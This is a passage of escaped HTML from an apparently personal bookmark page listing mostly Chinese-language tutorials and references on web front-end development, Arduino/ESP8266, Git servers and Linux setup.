rel=\"noopener\">http://www.wfublog.com/2012/10/javascript-patterns-1.html</a></p>\n<p>Javascript 語法教學、技巧 (筆記)＠WFU BLOG<br><a href=\"http://www.wfublog.com/2012/04/javascript.html\" target=\"_blank\" rel=\"noopener\">http://www.wfublog.com/2012/04/javascript.html</a></p>\n<p>支援 BootStrap 的所見即所得的網頁編輯工具 | Soft &amp; Share<br><a href=\"https://softnshare.wordpress.com/2016/\" target=\"_blank\" rel=\"noopener\">https://softnshare.wordpress.com/2016/</a><br>01/31/%E6%94%AF%E6%8F%B4bootstrap%E7%9A%84%E6%89%80%E8%A6%8B%E5%8D%B3%E6%89%80%E5%BE%97%E7%9A%84%E7%B6%B2%E9%A0%81%E7%B7%A8%E8%BC%AF%E5%B7%A5%E5%85%B7/<br>認識 Git 資料結構中的物件資料庫與物件之間的關係 - YouTube<br><a href=\"https://www.youtube.com/watch?v=PZbSRy_ow0U\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=PZbSRy_ow0U</a></p>\n<p>葉難: Arduino：在 Windows 裡使用 Python 語言經由 Firmata 協定控制 Arduino 開發板<br><a href=\"http://yehnan.blogspot.com/2016/01/arduinowindowspythonfirmataarduino.html\" target=\"_blank\" rel=\"noopener\">http://yehnan.blogspot.com/2016/01/arduinowindowspythonfirmataarduino.html</a></p>\n<p>找不到頁面 - vMaker 台灣自造者 vMaker 台灣自造者 | Page 77<br><a href=\"https://vmaker.tw/project/view/77\" target=\"_blank\" rel=\"noopener\">https://vmaker.tw/project/view/77</a></p>\n<p>USB 連線使用 Webduino Blockly<br><a href=\"http://blog.ilc.edu.tw/blog/index.php?op=printView&amp;articleId=625816&amp;blogId=868\" target=\"_blank\" rel=\"noopener\">http://blog.ilc.edu.tw/blog/index.php?op=printView&amp;articleId=625816&amp;blogId=868</a></p>\n<p>How to format a JavaScript date - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/3552461/how-to-format-a-javascript-date\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/3552461/how-to-format-a-javascript-date</a></p>\n<p>Setting up Sublime Text 3 for Rails Development | mattbrictson.com<br><a href=\"https://mattbrictson.com/sublime-text-3-recommendations\" target=\"_blank\" rel=\"noopener\">https://mattbrictson.com/sublime-text-3-recommendations</a></p>\n<p>使用網頁安裝 | Sublime 安裝與教學<br><a href=\"https://dissidia3408.gitbooks.io/sublime-text-tutorial/content/browser-add.html\" target=\"_blank\" rel=\"noopener\">https://dissidia3408.gitbooks.io/sublime-text-tutorial/content/browser-add.html</a></p>\n<p>首頁 | Sublime 安裝與教學<br><a href=\"https://dissidia3408.gitbooks.io/sublime-text-tutorial/content/index.html\" target=\"_blank\" rel=\"noopener\">https://dissidia3408.gitbooks.io/sublime-text-tutorial/content/index.html</a></p>\n<p>Linux 如何在開機的時候直接進入文字(命令列)介面？ | MagicLen<br><a href=\"https://magiclen.org/linux-text/\" target=\"_blank\" rel=\"noopener\">https://magiclen.org/linux-text/</a></p>\n<p>for…of - JavaScript | MDN<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of</a></p>\n<p>搞懂這些，你也可以大聲說”我搞定 IE8 了！” – 25sprout<br><a href=\"https://blog.25sprout.com/%E6%90%9E%E6%87%82%E9%80%99%E4%BA%9B-%E4%BD%A0%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%81%B2%E8%AA%AA-%E6%88%91%E6%90%9E%E5%AE%9A-ie8-%E4%BA%86-8ca3ca1f6367\" target=\"_blank\" rel=\"noopener\">https://blog.25sprout.com/%E6%90%9E%E6%87%82%E9%80%99%E4%BA%9B-%E4%BD%A0%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%81%B2%E8%AA%AA-%E6%88%91%E6%90%9E%E5%AE%9A-ie8-%E4%BA%86-8ca3ca1f6367</a></p>\n<p>[ASP.NET] 實現與防範 CSRF 跨網站請求偽造攻擊 | .Net 蛤什麼? - 點部落<br><a href=\"https://dotblogs.com.tw/joysdw12/archive/2013/09/16/asp-net-cross-site-request-forgery.aspx\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/joysdw12/archive/2013/09/16/asp-net-cross-site-request-forgery.aspx</a></p>\n<p>Android Development: some of the best practices. Jun 2016 edition. – Medium<br><a href=\"https://medium.com/@stepango/android-development-some-of-the-best-practices-jun-2016-edition-e505a0558a71\" target=\"_blank\" rel=\"noopener\">https://medium.com/@stepango/android-development-some-of-the-best-practices-jun-2016-edition-e505a0558a71</a></p>\n<p>JQuery Cycle Plugin<br><a href=\"http://jquery.malsup.com/cycle/\" target=\"_blank\" rel=\"noopener\">http://jquery.malsup.com/cycle/</a></p>\n<p>Cycle2<br><a href=\"http://jquery.malsup.com/cycle2/\" target=\"_blank\" rel=\"noopener\">http://jquery.malsup.com/cycle2/</a></p>\n<p>Raspberry Pi • View topic - Rootfs and /dev/root full<br><a href=\"https://www.raspberrypi.org/forums/viewtopic.php?t=71520&amp;p=521414\" target=\"_blank\" rel=\"noopener\">https://www.raspberrypi.org/forums/viewtopic.php?t=71520&amp;p=521414</a></p>\n<p>CSS Font-Size: em、px 、pt 、Percent 之间的关系及换算<em>CSS 教程_CSS</em>网页制作_脚本之家<br><a href=\"http://m.jb51.net/css/166291.html\" target=\"_blank\" rel=\"noopener\">http://m.jb51.net/css/166291.html</a></p>\n<p>Web Design Clip | Web デザインクリップ<br><a href=\"http://www.webdesignclip.com/\" target=\"_blank\" rel=\"noopener\">http://www.webdesignclip.com/</a></p>\n<p>慶應義塾<br><a href=\"https://www.keio.ac.jp/ja/\" target=\"_blank\" rel=\"noopener\">https://www.keio.ac.jp/ja/</a></p>\n<p>Functional Reactive Programming 的入門心得 – Medium<br><a href=\"https://medium.com/@rayshih771012/functional-reactive-programming-70be6bd8726b\" target=\"_blank\" rel=\"noopener\">https://medium.com/@rayshih771012/functional-reactive-programming-70be6bd8726b</a></p>\n<p>javascript - jQuery watch for domElement changes? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/1960919/jquery-watch-for-domelement-changes\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/1960919/jquery-watch-for-domelement-changes</a></p>\n<p>javascript - DOMsubtreemodified equivalent in IE - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/19869547/domsubtreemodified-equivalent-in-ie\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/19869547/domsubtreemodified-equivalent-in-ie</a></p>\n<p>JavaScript 語言核心（11）this 是什麼？ by caterpillar | CodeData<br><a href=\"http://www.codedata.com.tw/javascript/essential-javascript-11-what-is-this/\" target=\"_blank\" rel=\"noopener\">http://www.codedata.com.tw/javascript/essential-javascript-11-what-is-this/</a></p>\n<p>Apache Ant™ User Manual<br><a href=\"http://ant.apache.org/manual/index.html\" target=\"_blank\" rel=\"noopener\">http://ant.apache.org/manual/index.html</a></p>\n<p><a href=\"http://yhhuang1966.blogspot.com/2015/07/esp8266-wifi-at-command.html\" target=\"_blank\" rel=\"noopener\">http://yhhuang1966.blogspot.com/2015/07/esp8266-wifi-at-command.html</a><br><a href=\"http://yhhuang1966.blogspot.com/2015/07/esp8266-wifi-at-command.html\" target=\"_blank\" rel=\"noopener\">http://yhhuang1966.blogspot.com/2015/07/esp8266-wifi-at-command.html</a></p>\n<p>ㄆㄜ ㄊㄧㄡ ㄙ ˋ: 自行更新 ESP8266 , ESP-01 無線模組韌體至 AT：0.23, SDK：1.0.1<br><a href=\"http://ruten-proteus.blogspot.com/2015/05/esp8266-esp-01-at023-sdk101.html\" target=\"_blank\" rel=\"noopener\">http://ruten-proteus.blogspot.com/2015/05/esp8266-esp-01-at023-sdk101.html</a></p>\n<p>ㄆㄜ ㄊㄧㄡ ㄙ ˋ: 自行更新 ESP8266 , ESP-01 無線模組韌體至 AT：0.23, SDK：1.0.1<br><a href=\"http://ruten-proteus.blogspot.com/2015/05/esp8266-esp-01-at023-sdk101.html?view=classic\" target=\"_blank\" rel=\"noopener\">http://ruten-proteus.blogspot.com/2015/05/esp8266-esp-01-at023-sdk101.html?view=classic</a></p>\n<p>頁面載入發生問題<br>file:///C:/Users/ADMINI~1/AppData/Local/Temp/Arduino_ESP8266.pdf</p>\n<p>NodeList - Web APIs | MDN<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/NodeList\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Web/API/NodeList</a></p>\n<p>javascript - How to remove all listeners in an element? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/9251837/how-to-remove-all-listeners-in-an-element\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/9251837/how-to-remove-all-listeners-in-an-element</a></p>\n<p>node.js - How do I include a JavaScript file in another JavaScript file? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/950087/how-do-i-include-a-javascript-file-in-another-javascript-file\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/950087/how-do-i-include-a-javascript-file-in-another-javascript-file</a></p>\n<p>CSS &amp; HTML - 純 CSS 點擊下拉式選單 - Twincl<br><a href=\"https://tw.twincl.com/css-html/*6630\" target=\"_blank\" rel=\"noopener\">https://tw.twincl.com/css-html/*6630</a></p>\n<p>[讀書筆記] CSS 基礎技巧懶人包 « Blog.XDite.net<br><a href=\"http://blog.xdite.net/posts/2012/01/29/css-tricks-summary\" target=\"_blank\" rel=\"noopener\">http://blog.xdite.net/posts/2012/01/29/css-tricks-summary</a></p>\n<p>Ene | ToMo Forunesia<br><a href=\"http://tomo.forunesia.com/pin/1950/\" target=\"_blank\" rel=\"noopener\">http://tomo.forunesia.com/pin/1950/</a></p>\n<p>JSManipulate - Javascript Image Filters &amp; Effects<br><a href=\"http://joelb.me/jsmanipulate/\" target=\"_blank\" rel=\"noopener\">http://joelb.me/jsmanipulate/</a></p>\n<p>Why JQuery (&gt; 3.x) Promise is ok - JSFiddle<br><a href=\"http://fiddle.jshell.net/mbychawski/77Lxzjzq/\" target=\"_blank\" rel=\"noopener\">http://fiddle.jshell.net/mbychawski/77Lxzjzq/</a></p>\n<p>三個不要再用 jQuery Promise 的理由 « Pymaster<br><a href=\"http://pymaster.logdown.com/post/379240-3-do-not-use-jquery-promise-from-todays-reason\" target=\"_blank\" rel=\"noopener\">http://pymaster.logdown.com/post/379240-3-do-not-use-jquery-promise-from-todays-reason</a></p>\n<p>Shiny<br><a href=\"https://blog.shinychang.net/\" target=\"_blank\" rel=\"noopener\">https://blog.shinychang.net/</a></p>\n<p>Vuedinner #1 第一次用 Vue.js 就愛上 by Kuro - YouTube<br><a href=\"https://www.youtube.com/watch?v=jXdZlbH_ut8&amp;feature=youtu.be\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=jXdZlbH_ut8&amp;feature=youtu.be</a></p>\n<p>【教學】SSD 優化 (1) 4K 對齊 【以 Win10 為例】 @ 歐飛先生 :: 痞客邦 PIXNET ::<br><a href=\"http://ofeyhong.pixnet.net/blog/post/190625809-%E3%80%90%E6%95%99%E5%AD%B8%E3%80%91ssd-%E5%84%AA%E5%8C%96-(1)-4k%E5%B0%8D%E9%BD%8A--%E3%80%90%E4%BB%A5win10%E7%82%BA%E4%BE%8B%E3%80%91\" target=\"_blank\" rel=\"noopener\">http://ofeyhong.pixnet.net/blog/post/190625809-%E3%80%90%E6%95%99%E5%AD%B8%E3%80%91ssd-%E5%84%AA%E5%8C%96-(1)-4k%E5%B0%8D%E9%BD%8A--%E3%80%90%E4%BB%A5win10%E7%82%BA%E4%BE%8B%E3%80%91</a></p>\n<p>【Youtube API】jQurry 控制 Youtube 播放器：Youtube API 控制、崁入播放程式、jQuery 播放 Youtube | ucamc<br><a href=\"http://www.ucamc.com/e-learning/javascript/104-youtube-api-jquery.html\" target=\"_blank\" rel=\"noopener\">http://www.ucamc.com/e-learning/javascript/104-youtube-api-jquery.html</a></p>\n<p>[JavaScript] How to Control YouTube AutoPlay and Play after another video end. | Blackie 的失敗筆記 - 點部落<br><a href=\"https://dotblogs.com.tw/blackie1019/2014/09/17/146581\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/blackie1019/2014/09/17/146581</a></p>\n<p>【YouTube】(三)如何透過 YouTube IFrame Player API 控制 Youtube 撥放器？ - Elaine Wu<br><a href=\"http://blog.elaine-iic.tw/2015/07/youtube-iframe-player-api.html\" target=\"_blank\" rel=\"noopener\">http://blog.elaine-iic.tw/2015/07/youtube-iframe-player-api.html</a></p>\n<p>Build Amazing Native Apps and Progressive Web Apps with Ionic Framework and Angular<br><a href=\"http://ionicframework.com/\" target=\"_blank\" rel=\"noopener\">http://ionicframework.com/</a></p>\n<p>KingKong Bruce 記事: DOM 修改文字節點 - innerText 或 textContent 傻傻分不清楚<br><a href=\"http://blog.kkbruce.net/2013/10/js-dom-edit-text-node-select-innerText-or-textContent.html\" target=\"_blank\" rel=\"noopener\">http://blog.kkbruce.net/2013/10/js-dom-edit-text-node-select-innerText-or-textContent.html</a></p>\n<p>Page Not Found – Elaine personal website<br><a href=\"http://blog.elaine.me/so-simple-theme/articles/React-webpack/\" target=\"_blank\" rel=\"noopener\">http://blog.elaine.me/so-simple-theme/articles/React-webpack/</a></p>\n<p>深入了解 JavaScript 模組化模式 « EasonLin’s Blog<br><a href=\"http://easonlin.logdown.com/posts/74228-javascript-module-pattern-in-depth\" target=\"_blank\" rel=\"noopener\">http://easonlin.logdown.com/posts/74228-javascript-module-pattern-in-depth</a></p>\n<p>node-webkit 教程(9)native api 之 Tray(托盘) | nw.js 中文文档<br><a href=\"https://wizardforcel.gitbooks.io/nwjs-doc/content/tutorial/9.html\" target=\"_blank\" rel=\"noopener\">https://wizardforcel.gitbooks.io/nwjs-doc/content/tutorial/9.html</a></p>\n<p>ColorDrop 你唯一需要的線上調色盤！收錄各種配色組合，提供設計開發上絕佳色彩來源｜數位時代<br><a href=\"https://www.bnext.com.tw/ext_rss/view/id/1828803\" target=\"_blank\" rel=\"noopener\">https://www.bnext.com.tw/ext_rss/view/id/1828803</a></p>\n<p>簡單弄一弄 Apache 的 Proxy 功能 – roga’s blog<br><a href=\"https://blog.roga.tw/2006/10/325\" target=\"_blank\" rel=\"noopener\">https://blog.roga.tw/2006/10/325</a></p>\n<p>Scrapy + Python 3: PTT 資料抓取與分析 - 翼之都, City of Wings<br><a href=\"http://city.shaform.com/blog/2016/02/28/scrapy.html\" target=\"_blank\" rel=\"noopener\">http://city.shaform.com/blog/2016/02/28/scrapy.html</a></p>\n<p>Front-end-Developer-Interview-Questions - 前端工程師面試問題集(繁體中文版)<br><a href=\"https://gist.github.com/jaceju/3e5ee109de63cb4c756b\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/jaceju/3e5ee109de63cb4c756b</a></p>\n<p>jaceju’s gists<br><a href=\"https://gist.github.com/jaceju\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/jaceju</a></p>\n<p>[Javascript] 幾個實用的 JS 小技巧 · Larry<br><a href=\"http://larry850806.github.io/2016/07/16/JS-tips/\" target=\"_blank\" rel=\"noopener\">http://larry850806.github.io/2016/07/16/JS-tips/</a></p>\n<p>Page not found · GitHub Pages<br><a href=\"http://liyaodong.com/2016/04/15/webpack-the-confusing-parts/\" target=\"_blank\" rel=\"noopener\">http://liyaodong.com/2016/04/15/webpack-the-confusing-parts/</a></p>\n<p>5500+ Best jQuery Plugins &amp; Tutorials with jQuery Demo examples 2017 - 2016<br><a href=\"http://www.jqueryrain.com/\" target=\"_blank\" rel=\"noopener\">http://www.jqueryrain.com/</a></p>\n<p>[工具使用]讓別人把檔案上傳到你的 Google Drive | John Wan’s Blog<br>https://<br>wanchiahung.wordpress.com/2015/12/16/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AE%93%E5%88%A5%E4%BA%BA%E6%8A%8A%E6%AA%94%E6%A1%88%E4%B8%8A%E5%82%B3%E5%88%B0%E4%BD%A0%E7%9A%84google-drive/<br>原來 Google 雲端硬碟也能開放「匿名上傳」，做為學生作業、比賽稿件上傳就不用再傷腦筋了！(Google Apps Script 應用服務指令碼)<br><a href=\"http://harmonica80.blogspot.com/2015/08/googlegoogle-apps-script.html\" target=\"_blank\" rel=\"noopener\">http://harmonica80.blogspot.com/2015/08/googlegoogle-apps-script.html</a></p>\n<p>基于 webpack 和 vue.js 搭建的 H5 端框架(其实主要用于 Hybrid 开发 H5 端框架，但是依然能够作为纯 web 端使用) | HcySunYang’s Blog<br><a href=\"http://hcysun.me/2016/03/25/%E5%9F%BA%E4%BA%8Ewebpack%E5%92%8Cvue.js%E6%90%AD%E5%BB%BA%E7%9A%84H5%E7%AB%AF%E6%A1%86%E6%9E%B6\" target=\"_blank\" rel=\"noopener\">http://hcysun.me/2016/03/25/%E5%9F%BA%E4%BA%8Ewebpack%E5%92%8Cvue.js%E6%90%AD%E5%BB%BA%E7%9A%84H5%E7%AB%AF%E6%A1%86%E6%9E%B6</a>(%E5%85%B6%E5%AE%9E%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8EHybrid%E<br>5%BC%80%E5%8F%91H5%E7%AB%AF%E6%A1%86%E6%9E%B6%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BE%9D%E7%84%B6%E8%83%BD%E5%A4%9F%E4%BD%9C%E4%B8%BA%E7%BA%AFweb%E7%AB%AF%E4%BD%BF%E7%94%A8)/<br>js Worker API 在倒计时中的使用 | HcySunYang’s Blog<br><a href=\"http://hcysun.me/2016/07/11/js-Worker-API-%E5%9C%A8%E5%80%92%E8%AE%A1%E6%97%B6%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/\" target=\"_blank\" rel=\"noopener\">http://hcysun.me/2016/07/11/js-Worker-API-%E5%9C%A8%E5%80%92%E8%AE%A1%E6%97%B6%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</a></p>\n<p>a 标签的 href 属性与 click 事件的烦恼 | HcySunYang’s Blog<br><a href=\"http://hcysun.me/2015/11/26/a%E6%A0%87%E7%AD%BE%E7%9A%84href%E5%B1%9E%E6%80%A7%E4%B8%8Eclick%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%83%A6%E6%81%BC/\" target=\"_blank\" rel=\"noopener\">http://hcysun.me/2015/11/26/a%E6%A0%87%E7%AD%BE%E7%9A%84href%E5%B1%9E%E6%80%A7%E4%B8%8Eclick%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%83%A6%E6%81%BC/</a></p>\n<p>資訊分享: JSLint 的錯誤提示都是什麼意思<br><a href=\"http://mark0120.blogspot.com/2016/03/jslint.html?view=sidebar&amp;m=1\" target=\"_blank\" rel=\"noopener\">http://mark0120.blogspot.com/2016/03/jslint.html?view=sidebar&amp;m=1</a></p>\n<p>嫁給 RD 的 UI Designer · 嫁給 RD 的 UI Designer<br><a href=\"https://blog.akanelee.me/\" target=\"_blank\" rel=\"noopener\">https://blog.akanelee.me/</a></p>\n<p>Drupal 8 主题开发指南中文版 · GitBook<br><a href=\"https://www.gitbook.com/book/ranqiangjun/the-drupal-8-theming-guide/details\" target=\"_blank\" rel=\"noopener\">https://www.gitbook.com/book/ranqiangjun/the-drupal-8-theming-guide/details</a></p>\n<p>閃亮亮大師之路<br><a href=\"http://blog.dj1020.net/\" target=\"_blank\" rel=\"noopener\">http://blog.dj1020.net/</a></p>\n<p>ESP8266-workshop // Speaker Deck<br><a href=\"https://speakerdeck.com/mlwmlw/esp8266-workshop/\" target=\"_blank\" rel=\"noopener\">https://speakerdeck.com/mlwmlw/esp8266-workshop/</a></p>\n<p>ESP8266 - HackMD<br><a href=\"https://hackmd.io/s/NJofJDChx\" target=\"_blank\" rel=\"noopener\">https://hackmd.io/s/NJofJDChx</a></p>\n<p>囧星人 | 冏星人 Kyon<br><a href=\"http://kyontw.com/#works\" target=\"_blank\" rel=\"noopener\">http://kyontw.com/#works</a></p>\n<p>Installing VMware Tools in an Ubuntu virtual machine (1022525) | VMware KB<br><a href=\"https://kb.vmware.com/selfservice/search.do?cmd=displayKC&amp;docType=kc&amp;docTypeID=DT_KB_1_1&amp;externalId=1022525\" target=\"_blank\" rel=\"noopener\">https://kb.vmware.com/selfservice/search.do?cmd=displayKC&amp;docType=kc&amp;docTypeID=DT_KB_1_1&amp;externalId=1022525</a></p>\n<p>茫茫網海中的冷日 - [轉貼]設定 MySQL 連線數<br><a href=\"http://www.coolsun.idv.tw/modules/xhnewbb/viewtopic.php?topic_id=1486&amp;viewmode=flat\" target=\"_blank\" rel=\"noopener\">http://www.coolsun.idv.tw/modules/xhnewbb/viewtopic.php?topic_id=1486&amp;viewmode=flat</a></p>\n<p>mysql - How can I set the default value of a field as ‘0000-00-00 00:00:00’? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/25349126/how-can-i-set-the-default-value-of-a-field-as-0000-00-00-000000\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/25349126/how-can-i-set-the-default-value-of-a-field-as-0000-00-00-000000</a></p>\n<p>Docker Infra 架構簡介與實例 // TsaiKD Blog<br><a href=\"https://tsaikd.org/blog/2014/12-25-Docker-infra/\" target=\"_blank\" rel=\"noopener\">https://tsaikd.org/blog/2014/12-25-Docker-infra/</a></p>\n<p>Documentation - Materialize<br><a href=\"http://materializecss.com/\" target=\"_blank\" rel=\"noopener\">http://materializecss.com/</a></p>\n<p>Sublime Text (3) for PHP Developers - Matt Stauffer on Laravel, PHP, Frontend development<br><a href=\"https://mattstauffer.co/blog/sublime-text-3-for-php-developers\" target=\"_blank\" rel=\"noopener\">https://mattstauffer.co/blog/sublime-text-3-for-php-developers</a></p>\n<p>Add IBM Java SDK from WebSphere in IntelliJ - YouTube<br><a href=\"https://www.youtube.com/watch?v=6M1nXdpQqnI\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=6M1nXdpQqnI</a></p>\n<p>Page not found · GitHub Pages<br><a href=\"http://blog.chivincent.net/pages/toolbox\" target=\"_blank\" rel=\"noopener\">http://blog.chivincent.net/pages/toolbox</a></p>\n<p>JSON Generator – Tool for generating random data<br><a href=\"http://www.json-generator.com/\" target=\"_blank\" rel=\"noopener\">http://www.json-generator.com/</a></p>\n<p>Vuediner #2 - Ping Pong ! Vuex + Laravel by 鄭宇翔 - YouTube<br><a href=\"https://www.youtube.com/watch?v=C1aLFTs6QM8\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=C1aLFTs6QM8</a></p>\n<p>用 JavaScript 學習資料結構和演算法：堆疊（Stack）篇 | TechBridge 技術共筆部落格<br><a href=\"http://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/\" target=\"_blank\" rel=\"noopener\">http://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/</a></p>\n<p>Linux DHCP DNS 設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天<br><a href=\"http://ithelp.ithome.com.tw/articles/10071258\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10071258</a></p>\n<p>UI 動態資源分享 « YUNCHI<br><a href=\"http://yunchi-blog.logdown.com/posts/223094-ui-dynamic-resource-sharing\" target=\"_blank\" rel=\"noopener\">http://yunchi-blog.logdown.com/posts/223094-ui-dynamic-resource-sharing</a></p>\n<p>Hero Fighter, Little Fighter 2 Official Forum • View topic - LF1 Data.dat 改檔 重見天日!<br><a href=\"http://ztage.com/forum/viewtopic.php?f=3&amp;t=10761\" target=\"_blank\" rel=\"noopener\">http://ztage.com/forum/viewtopic.php?f=3&amp;t=10761</a></p>\n<p>Zwe’s blog: linux 讓終端機有顏色<br><a href=\"http://zwe0405.blogspot.tw/2011/10/linux.html\" target=\"_blank\" rel=\"noopener\">http://zwe0405.blogspot.tw/2011/10/linux.html</a></p>\n<p>權限不足<br><a href=\"https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/?pli=1\" target=\"_blank\" rel=\"noopener\">https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/?pli=1</a></p>\n<p>GAE Java IDE installation<br><a href=\"https://www.slideshare.net/peihsinsu/gae-java-ide-installing-eclipseide-1\" target=\"_blank\" rel=\"noopener\">https://www.slideshare.net/peihsinsu/gae-java-ide-installing-eclipseide-1</a></p>\n<p>Google Cloud Platform Pricing Calculator  |  Google Cloud Platform<br><a href=\"https://cloud.google.com/products/calculator/\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/products/calculator/</a></p>\n<p>小狐狸事務所: ESP8266 更新韌體<br><a href=\"http://yhhuang1966.blogspot.com/2015/08/esp8266.html\" target=\"_blank\" rel=\"noopener\">http://yhhuang1966.blogspot.com/2015/08/esp8266.html</a></p>\n<p>活動報名 | 財團法人開放文化基金會<br><a href=\"https://ocf.neticrm.tw/civicrm/event/register?_qf_ThankYou_display=1&amp;qfKey=1aa9e3458ac09bae24bfb0c7c7fc2fff_2087\" target=\"_blank\" rel=\"noopener\">https://ocf.neticrm.tw/civicrm/event/register?_qf_ThankYou_display=1&amp;qfKey=1aa9e3458ac09bae24bfb0c7c7fc2fff_2087</a></p>\n<p>簡易 git server 架設教學 (用 Ubuntu linux) | 小 B 雜 Blog<br><a href=\"http://mix.bruceli.net/2011/02/git-server-ubuntu-linux.html\" target=\"_blank\" rel=\"noopener\">http://mix.bruceli.net/2011/02/git-server-ubuntu-linux.html</a></p>\n<p>浮雲雅築: [研究] Ubuntu 14.04 Desktop x64 安裝 VMware Tools 9.6.2<br><a href=\"http://shaurong.blogspot.com/2014/07/ubuntu-1404-desktop-x64-vmware-tools-962.html\" target=\"_blank\" rel=\"noopener\">http://shaurong.blogspot.com/2014/07/ubuntu-1404-desktop-x64-vmware-tools-962.html</a></p>\n<p><a href=\"https://www.computersnyou.com/266/how-to-solve-vmware-is-using-port-443/\" target=\"_blank\" rel=\"noopener\">https://www.computersnyou.com/266/how-to-solve-vmware-is-using-port-443/</a><br><a href=\"https://www.computersnyou.com/266/how-to-solve-vmware-is-using-port-443/\" target=\"_blank\" rel=\"noopener\">https://www.computersnyou.com/266/how-to-solve-vmware-is-using-port-443/</a></p>\n<p><a href=\"http://soarlin.pixnet.net/blog/post/42810173-%E4%BD%BF%E7%94%A8-gitolite-%E6%9E%B6%E8%A8%AD-git-server%EF%BC%8C%E4%B8%A6%E5%AE%89%E8%A3%9D-gitweb\" target=\"_blank\" rel=\"noopener\">http://soarlin.pixnet.net/blog/post/42810173-%E4%BD%BF%E7%94%A8-gitolite-%E6%9E%B6%E8%A8%AD-git-server%EF%BC%8C%E4%B8%A6%E5%AE%89%E8%A3%9D-gitweb</a><br><a href=\"http://soarlin.pixnet.net/blog/post/42810173-%E4%BD%BF%E7%94%A8-gitolite-%E6%9E%B6%E8%A8%AD-git-server%EF%BC%8C%E4%B8%A6%E5%AE%89%E8%A3%9D-gitweb\" target=\"_blank\" rel=\"noopener\">http://soarlin.pixnet.net/blog/post/42810173-%E4%BD%BF%E7%94%A8-gitolite-%E6%9E%B6%E8%A8%AD-git-server%EF%BC%8C%E4%B8%A6%E5%AE%89%E8%A3%9D-gitweb</a></p>\n<p>使用 Git Mirror 無痛轉移 Git Server | 不怕就是強<br><a href=\"https://dinos80152.wordpress.com/2015/09/21/%E4%BD%BF%E7%94%A8-git-mirror-%E7%84%A1%E7%97%9B%E8%BD%89%E7%A7%BB-git-server/\" target=\"_blank\" rel=\"noopener\">https://dinos80152.wordpress.com/2015/09/21/%E4%BD%BF%E7%94%A8-git-mirror-%E7%84%A1%E7%97%9B%E8%BD%89%E7%A7%BB-git-server/</a></p>\n<p>Chromatic Coder: 架設 Gerrit 和 Git<br><a href=\"http://blog.dsmu.me/2013/04/gerritgit.html\" target=\"_blank\" rel=\"noopener\">http://blog.dsmu.me/2013/04/gerritgit.html</a></p>\n<p>11 个超棒的 jQuery 分步指引插件 - Web 前端 - ITeye 资讯<br><a href=\"http://www.iteye.com/news/27626\" target=\"_blank\" rel=\"noopener\">http://www.iteye.com/news/27626</a></p>\n<p>Linux 架設使用 SSH 共享存取的 Git Server - Tsung’s Blog<br><a href=\"https://blog.longwin.com.tw/2011/03/build-git-env-share-over-ssh-2011/?doing_wp_cron=1471779497.9948770999908447265625\" target=\"_blank\" rel=\"noopener\">https://blog.longwin.com.tw/2011/03/build-git-env-share-over-ssh-2011/?doing_wp_cron=1471779497.9948770999908447265625</a></p>\n<p>CentOS 架設 GitServer « Sam 的程式筆記<br><a href=\"http://samchu.logdown.com/posts/778052-set-up-centos-gitserver\" target=\"_blank\" rel=\"noopener\">http://samchu.logdown.com/posts/778052-set-up-centos-gitserver</a></p>\n<p>Ubuntu 架設 GitServer « Sam 的程式筆記<br><a href=\"http://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver\" target=\"_blank\" rel=\"noopener\">http://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver</a></p>\n<p>SSH 連現時出現「WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!」解決辦法 | 電腦故我在<br><a href=\"https://blog.allenchou.cc/warning-remote-host-identification-has-changed/\" target=\"_blank\" rel=\"noopener\">https://blog.allenchou.cc/warning-remote-host-identification-has-changed/</a></p>\n<p><a href=\"http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC\" target=\"_blank\" 